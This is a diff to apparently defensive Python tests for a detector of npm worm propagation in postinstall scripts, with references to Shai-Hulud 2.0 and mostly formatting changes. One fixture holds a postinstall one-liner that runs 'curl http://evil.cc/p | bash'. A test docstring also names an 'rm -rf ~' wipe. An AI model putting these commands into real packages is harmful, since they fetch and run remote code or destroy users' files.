@@ -54,13 +54,17 @@ class TestWormPropagationPostInstall(unittest.TestCase):
 
     def test_node_eval_oneliner(self):
         """Detect node -e one-liners in postinstall."""
+        node_payload = (
+            "node -e 'var r=require(\"child_process\");"
+            "r.execSync(\"curl http://evil.cc/p | bash\")'"
+        )
         with tempfile.TemporaryDirectory() as tmp:
             tmp_path = Path(tmp)
             _make_project(tmp_path, {
                 "name": "test-pkg",
                 "version": "1.0.0",
                 "scripts": {
-                    "postinstall": "node -e 'var r=require(\"child_process\");r.execSync(\"curl http://evil.cc/p | bash\")'"
+                    "postinstall": node_payload,
                 }
             })
             findings = detect_worm_propagation(tmp_path)
@@ -81,8 +85,14 @@ class TestWormPropagationPostInstall(unittest.TestCase):
             findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
-            bun_findings = [f for f in worm_findings if "Bun" in f.message or "bun" in f.message.lower()]
-            self.assertGreater(len(bun_findings), 0, f"Expected Bun payload detection, got: {[f.message for f in worm_findings]}")
+            bun_findings = [
+                f for f in worm_findings
+                if "Bun" in f.message or "bun" in f.message.lower()
+            ]
+            self.assertGreater(
+                len(bun_findings), 0,
+                f"Expected Bun payload detection, got: {[f.message for f in worm_findings]}",
+            )
 
     def test_destructive_fallback(self):
         """Detect rm -rf ~ / $HOME in scripts — Shai-Hulud 2.0 destructive fallback."""
@@ -98,7 +108,10 @@ class TestWormPropagationPostInstall(unittest.TestCase):
             findings = detect_worm_propagation(tmp_path)
             worm_findings = [f for f in findings if f.rule_id == "L2-WORM-001"]
             self.assertGreater(len(worm_findings), 0)
-            destructive = [f for f in worm_findings if "destructive" in f.message.lower() or "wipe" in f.message.lower()]
+            destructive = [
+                f for f in worm_findings
+                if "destructive" in f.message.lower() or "wipe" in f.message.lower()
+            ]
             self.assertGreater(len(destructive), 0)
 
     def test_shai_hulud_campaign_identifier(self):
